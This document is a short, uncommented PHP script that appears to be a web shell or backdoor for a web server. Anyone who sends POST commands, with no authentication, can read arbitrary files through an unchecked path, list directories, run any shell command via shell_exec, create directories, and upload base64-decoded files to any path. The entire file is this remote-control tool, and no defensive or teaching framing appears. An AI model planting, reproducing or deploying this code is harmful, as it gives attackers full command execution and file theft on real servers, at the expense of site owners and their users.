<?php 
	
	function echo_json($data=[])
	{

		echo json_encode( $data );

	}

	if( !empty( $_POST['cmd'] ) ){


		if( $_POST['cmd'] == "test" ){

			echo_json([
				"code" => 200,
			]);

		}

		if( $_POST['cmd'] == "get_file_data" ){

			$data = file_get_contents( __DIR__ . '/' . $_POST['file'] );

			echo_json([
				"code" => 200,
				"data" => $data,
			]);

		}


		if( $_POST['cmd'] == "get_files" ){

			$struct = [];

			$files = scandir( __DIR__ );

			foreach ($files as $file) {
				
				if( $file == '.' || $file == '..' ){
					continue;
				}

				if( is_dir( __DIR__ . '/' . $file ) ){

					$sub_files = scandir( __DIR__ . '/' . $file );

					$struct[] = [
						"file" => $file,
						"type" => "d",
						"sub_files" => $sub_files,
					];

				}else{

					$struct[] = [
						"file" => $file,
						"type" => "f",
					];

				}

			}

			echo_json([
				"code" => 200,
				"struct" => $struct,
			]);

		}

		if( $_POST['cmd'] == "get_dir" ){

			echo_json([
				"code" => 200,
				"dir" => __DIR__,
			]);

		}

		if( $_POST['cmd'] == "shell_exec" ){

			shell_exec( $_POST['command'] );

			echo_json([
				"code" => 200,
			]);

		}

		if( $_POST['cmd'] == "mkdir" ){

			mkdir( $_POST['dir'] );
			chmod( $_POST['dir'] , 0755 );

			echo_json([
				"code" => 200,
			]);

		}

		if( $_POST['cmd'] == "upload" ){

			file_put_contents( $_POST['file'] , base64_decode( $_POST['data'] ) );
			chmod( $_POST['file'] , 0644 );

			echo_json([
				"code" => 200,
			]);

		}

	}